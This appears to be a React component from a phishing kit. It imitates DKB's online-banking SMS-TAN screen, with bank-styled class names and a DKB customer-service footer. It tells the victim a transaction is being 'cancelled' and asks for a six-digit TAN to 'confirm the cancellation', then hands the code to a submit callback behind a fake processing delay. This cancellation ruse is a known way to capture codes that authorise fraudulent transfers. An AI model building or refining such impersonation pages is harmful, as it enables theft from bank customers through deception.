import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
      />
    );
  }

  return (
    <div className="dkb-main-layout">
      <div className="dkb-tan-container">
        
        {/* Main SMS TAN Card */}
        <div className="dkb-tan-card">
          
          {/* Title */}
          <h1 className="dkb-tan-title">
            {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
          </h1>
          
          {/* Instruction Box */}
          <div className="dkb-tan-instruction-box">
            <p className="dkb-tan-instruction-text">
              {tanType === 'TRANSACTION_TAN'
                ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
              }
            </p>
          </div>

          {/* Transaction Details Card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div className="dkb-tan-transaction-box">
              <h2 className="dkb-tan-transaction-title">
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div className="dkb-tan-transaction-row">
                  <span className="dkb-tan-transaction-label">Betrag:</span>
                  <span className="dkb-tan-transaction-amount">{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div className="dkb-tan-transaction-row">
                    <span className="dkb-tan-transaction-label">Empfänger:</span>
                    <span className="dkb-tan-transaction-value">{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div className="dkb-tan-transaction-row">
                    <span className="dkb-tan-transaction-label">IBAN:</span>
                    <span className="dkb-tan-transaction-value" style={{ fontFamily: 'monospace', letterSpacing: '0.05rem' }}>
                      {transactionDetails.iban}
                    </span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div className="dkb-tan-transaction-row" style={{ borderBottom: 'none', paddingBottom: 0 }}>
                    <span className="dkb-tan-transaction-label">Verwendungszweck:</span>
                    <span className="dkb-tan-transaction-value">{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAN Input Section */}
          <div className="dkb-tan-input-box">
            <h3 className="dkb-tan-input-title">
              {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
            </h3>

            {/* TAN Input Fields */}
            <div className="dkb-tan-input-container">
              {tan.map((digit, index) => (
                <input
                  key={index}
                  id={`tan-input-${index}`}
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="dkb-tan-digit-input"
                  disabled={isSubmitting}
                />
              ))}
            </div>

            {/* Submit Button */}
            <div style={{ textAlign: 'center', marginBottom: '20px' }}>
              <button
                onClick={handleSubmit}
                disabled={tan.join('').length !== 6 || isSubmitting}
                className="dkb-tan-primary-button"
                style={{ width: isMobile ? '100%' : 'auto', minWidth: '200px' }}
              >
                {isSubmitting
                  ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                  : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                }
              </button>
            </div>

            {/* Resend Button */}
            {onResend && (
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleResend}
                  disabled={!canResend || isSubmitting}
                  className="dkb-tan-secondary-button"
                  style={{ width: isMobile ? '100%' : 'auto', minWidth: '200px' }}
                >
                  TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                </button>
              </div>
            )}

            {/* Cancel Link */}
            {onCancel && (
              <div style={{ textAlign: 'center' }}>
                <a 
                  href="#" 
                  onClick={(e) => {
                    e.preventDefault();
                    onCancel();
                  }}
                  className="dkb-tan-link"
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </a>
              </div>
            )}
          </div>

          {/* Footer Info */}
          <div style={{ textAlign: 'center' }}>
            <p className="dkb-tan-footer-text">
              Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie den DKB Kundenservice.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
